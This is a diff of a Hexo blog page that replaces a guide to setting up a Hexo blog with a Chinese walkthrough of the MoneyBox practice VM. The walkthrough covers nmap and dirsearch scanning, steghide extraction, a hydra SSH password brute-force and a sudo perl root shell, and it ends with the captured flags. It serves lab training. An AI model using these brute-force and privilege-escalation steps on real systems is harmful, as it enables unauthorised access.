@@ -17,24 +17,49 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>hexo博客搭建 | Hexo</title>
-  <meta name="description" content="Hexo博客搭建前期准备 提前安装好(node.js)[https:&#x2F;&#x2F;nodejs.org&#x2F;en] 左边的那个 提前安装好(GIt) 提前注册好一个github账号  搭建1.在本地找个目录放博客源文件，路径不要有中文 2.在选定的目录中，右键Git Bash Here 3.使用npm命令安装Hexo，输入： ​	npm install -g hexo-cli​	hexo init blog​">
+  <title>靶机_moneybox | Hexo</title>
+  <meta name="description" content="moneybox安装1.下载VirtualBox,导入靶机moneybox 2.moneybox配置，修改USB设备，选择1.1；网络，连接方式选择仅主机(Host-Only)   3.kali配置，打开设置，查看网络适配器(eth0)有桥接模式；打开VMware虚拟网络编辑器，桥接模式，桥接至VirtualBox HostOnly Ethernet Adapter   4.kali继续配置 1a">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hexo博客搭建">
-<meta property="og:url" content="http://example.com/2023/12/03/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/index.html">
+<meta property="og:title" content="靶机_moneybox">
+<meta property="og:url" content="http://example.com/2024/01/08/%E9%9D%B6%E6%9C%BA-moneybox/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Hexo博客搭建前期准备 提前安装好(node.js)[https:&#x2F;&#x2F;nodejs.org&#x2F;en] 左边的那个 提前安装好(GIt) 提前注册好一个github账号  搭建1.在本地找个目录放博客源文件，路径不要有中文 2.在选定的目录中，右键Git Bash Here 3.使用npm命令安装Hexo，输入： ​	npm install -g hexo-cli​	hexo init blog​">
+<meta property="og:description" content="moneybox安装1.下载VirtualBox,导入靶机moneybox 2.moneybox配置，修改USB设备，选择1.1；网络，连接方式选择仅主机(Host-Only)   3.kali配置，打开设置，查看网络适配器(eth0)有桥接模式；打开VMware虚拟网络编辑器，桥接模式，桥接至VirtualBox HostOnly Ethernet Adapter   4.kali继续配置 1a">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/123/main/img/image-20231203111500974.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/123/main/img/image-20231203131240980.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/123/main/img/image-20231203133105994.png">
-<meta property="article:published_time" content="2023-12-03T02:56:07.000Z">
-<meta property="article:modified_time" content="2023-12-03T05:57:17.366Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108091426404.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108091650004.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108091830697.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108092052187.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108092934937.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108093503790.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108094347360.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108095150046.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108095236333.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108095506178.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108095632985.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108095803489.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100002539.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100237196.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100340605.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100531219.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100629683.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100733226.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108101214063.png">
+<meta property="og:image" content="http://example.com/%E9%9D%B6%E6%9C%BA-moneybox.assets/image-20240108101555714.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108101714593.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108101821177.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108102027257.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108103015890.png">
+<meta property="og:image" content="http://example.com/%E9%9D%B6%E6%9C%BA-moneybox.assets/image-20240108103200834.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108103415766.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108103620507.png">
+<meta property="og:image" content="http://example.com/%E9%9D%B6%E6%9C%BA-moneybox.assets/image-20240108105426880.png">
+<meta property="article:published_time" content="2024-01-08T01:10:27.000Z">
+<meta property="article:modified_time" content="2024-01-08T02:56:01.131Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hkbijihxl/123/main/img/image-20231203111500974.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108091426404.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://example.com/2023/12/03/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/index.html">
+  <link rel="canonical" href="http://example.com/2024/01/08/%E9%9D%B6%E6%9C%BA-moneybox/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -330,14 +355,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-hexo博客搭建" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-靶机-moneybox" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      hexo博客搭建
+      靶机_moneybox
     </h1>
   
 
@@ -345,8 +370,8 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2023/12/03/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" class="article-date">
-	  <time datetime="2023-12-03T02:56:07.000Z" itemprop="datePublished">2023-12-03</time>
+	<a href="/2024/01/08/%E9%9D%B6%E6%9C%BA-moneybox/" class="article-date">
+	  <time datetime="2024-01-08T01:10:27.000Z" itemprop="datePublished">2024-01-08</time>
 	</a>
 </span>
         
@@ -354,48 +379,86 @@
 
         
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/12/03/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2024/01/08/%E9%9D%B6%E6%9C%BA-moneybox/#comments" class="article-comment-link">Comments</a></span>
         
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h1 id="Hexo博客搭建"><a href="#Hexo博客搭建" class="headerlink" title="Hexo博客搭建"></a>Hexo博客搭建</h1><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><ol>
-<li>提前安装好(node.js)[<a target="_blank" rel="noopener" href="https://nodejs.org/en]">https://nodejs.org/en]</a> 左边的那个</li>
-<li>提前安装好(GIt)</li>
-<li>提前注册好一个github账号</li>
-</ol>
-<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>1.在本地找个目录放博客源文件，路径不要有中文</p>
-<p>2.在选定的目录中，右键<code>Git Bash Here</code></p>
-<p>3.使用npm命令安装Hexo，输入：</p>
-<p>​	npm install -g hexo-cli<br>​	hexo init blog<br>​	cd blog<br>​	hexo g</p>
-<p>4.检查网站，在上一个<code>Git Bash Here</code>输入三条命令：</p>
-<p>​	hexo n test_my_site 	#创建一篇博客文章</p>
-<p>​	hexo g							#生成</p>
-<p>​	hexo s 							#预览</p>
-<p>​	之后就可以访问<a target="_blank" rel="noopener" href="http://localhost:4000/%E9%A2%84%E8%A7%88blog%E4%BA%86">http://localhost:4000/预览blog了</a></p>
-<p>5.配置ssh</p>
-<p>​	(1):cd ~&#x2F;.ssh 		#检查本机已存在的ssh密钥</p>
-<p>​	提示 No such file or directory 说明你是第一次使用git。</p>
-<p>​	(2):ssh-keygen -t rsa -C “邮件地址”</p>
-<p>​	然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本 	打开并复制里面的内容，打开你的github主页，进	入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</p>
-<p><img src="https://raw.githubusercontent.com/hkbijihxl/123/main/img/image-20231203111500974.png" alt="image-20231203111500974"></p>
-<p>​	(3):key填写”C:\Users\86178.ssh\id_rsa.pub”中的内容</p>
-<p>​	(4):ssh连接，测试是否成功</p>
-<p>​	ssh -T <a href="mailto:git@github.com">git@github.com</a> 	# 注意邮箱地址不用改</p>
-<p>​	(5):如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功：</p>
-<p>​	Hi liuxianan! You’ve successfully  authenticated, but GitHub does not provide shell access.</p>
-<p>​	(6):在blog目录下打开cmd(管理员身份)，输入：</p>
-<p>​	npm install hexo-deployer-git –save</p>
-<p>​	(7):Git Bash Here 中继续配置</p>
-<p>​	git config –global user.name “luozhixiaowo”		#你的github用户名<br>​	git config –global user.email “<a href="mailto:xxx@qq.com">xxx@qq.com</a>“		# 填写你的邮箱</p>
-<p>6.代码上传</p>
-<p>​	(1):在github上新建一个存储库，命名:github的用户名.github.io</p>
-<p>​	(2):编辑_config.yml文件，在最下面更改，注意格式，缩进不对会导致上传不成功</p>
-<p><img src="https://raw.githubusercontent.com/hkbijihxl/123/main/img/image-20231203131240980.png" alt="image-20231203131240980"></p>
-<p>​	(3):上传</p>
-<p>​	hexo d</p>
-<p><img src="https://raw.githubusercontent.com/hkbijihxl/123/main/img/image-20231203133105994.png" alt="image-20231203133105994"></p>
+        <h4 id="moneybox"><a href="#moneybox" class="headerlink" title="moneybox"></a>moneybox</h4><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><p>1.下载VirtualBox,导入靶机moneybox</p>
+<p>2.moneybox配置，修改USB设备，选择1.1；网络，连接方式选择仅主机(Host-Only)</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108091426404.png" alt="image-20240108091426404"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108091650004.png" alt="image-20240108091650004"></p>
+<p>3.kali配置，打开设置，查看网络适配器(eth0)有桥接模式；打开VMware虚拟网络编辑器，桥接模式，桥接至VirtualBox HostOnly Ethernet Adapter</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108091830697.png" alt="image-20240108091830697"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108092052187.png" alt="image-20240108092052187"></p>
+<p>4.kali继续配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0  查看eth0下的主机</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108092934937.png" alt="image-20240108092934937"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifdown eth0		关闭</span><br><span class="line">ifup eth0		开启</span><br><span class="line">用来刷新网卡eth0</span><br></pre></td></tr></table></figure>
+
+<p>5.验证，访问192.168.56.102 ，成功访问</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108093503790.png" alt="image-20240108093503790"></p>
+<h6 id="flag获取"><a href="#flag获取" class="headerlink" title="flag获取"></a>flag获取</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.56.102</span><br><span class="line">nmap -p 1-1000 192.168.56.102 扫端口</span><br><span class="line">nmap -p 21,22,80 -sC 192.168.56.102 测试</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108094347360.png" alt="image-20240108094347360"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.56.102 -x 403,404,401  目录扫描</span><br><span class="line">发现blog目录</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108095150046.png" alt="image-20240108095150046"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108095236333.png" alt="image-20240108095236333"></p>
+<p>查看网页源代码</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108095506178.png" alt="image-20240108095506178"></p>
+<!--the hint is the another secret directory is S3cr3t-T3xt-->
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http://192.168.56.102/S3cr3t-T3xt/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108095632985.png" alt="image-20240108095632985"></p>
+<p>查看网页源代码，获得&lt;!..Secret Key 3xtr4ctd4t4 &gt;</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108095803489.png" alt="image-20240108095803489"></p>
+<p>ftp登录一下</p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100002539.png" alt="image-20240108100002539"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100237196.png" alt="image-20240108100237196"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help 帮助手册</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100340605.png" alt="image-20240108100340605"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100531219.png" alt="image-20240108100531219"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get trytofind.jpg 下载</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100629683.png" alt="image-20240108100629683"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108100733226.png" alt="image-20240108100733226"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings trytofind.jpg 通过二进制查看</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108101214063.png" alt="image-20240108101214063"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E9%9D%B6%E6%9C%BA-moneybox.assets/image-20240108101555714.png" alt="image-20240108101555714"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide  extract -sf trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108101714593.png" alt="image-20240108101714593"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat data.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108101821177.png" alt="image-20240108101821177"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -h	帮助手册 九头蛇</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108102027257.png" alt="image-20240108102027257"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l renu -P ./plists ssh://192.168.56.102 密码爆破</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108103015890.png" alt="image-20240108103015890"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh renu@192.168.56.102   登录</span><br><span class="line">ls 查看</span><br><span class="line">获得flag1 us3r1&#123;F14g:0ku74tbd3777y4&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E9%9D%B6%E6%9C%BA-moneybox.assets/image-20240108103200834.png" alt="image-20240108103200834"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .bash_history 查看历史纪录</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108103415766.png" alt="image-20240108103415766"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh lily@192.168.56.102 登录lily账户</span><br><span class="line">ls</span><br><span class="line">cat user2.txt</span><br><span class="line">获得flag2 us3r&#123;F14g:tr5827r5wu6nklao&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240108103620507.png" alt="image-20240108103620507"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br><span class="line">id</span><br><span class="line">cd /root</span><br><span class="line">ls -al</span><br><span class="line">cat .root.txt</span><br><span class="line">获得最终flag3  r00t&#123;H4ckth3p14n3t&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E9%9D%B6%E6%9C%BA-moneybox.assets/image-20240108105426880.png" alt="image-20240108105426880"></p>
 
       
     </div>
@@ -405,7 +468,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://example.com/2023/12/03/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" title="hexo博客搭建" target="_blank" rel="external">http://example.com/2023/12/03/hexo博客搭建/</a>
+      <a href="http://example.com/2024/01/08/%E9%9D%B6%E6%9C%BA-moneybox/" title="靶机_moneybox" target="_blank" rel="external">http://example.com/2024/01/08/靶机-moneybox/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -451,13 +514,9 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/2023/12/03/markdown%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" title="markdown的使用说明"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/2023/12/02/Cent%20OS%207/" title="Cent OS 7命令"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2024/01/07/pikachu%E5%92%8Cbp%E9%9D%B6%E5%9C%BA/" title="pikachu和bp靶场"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
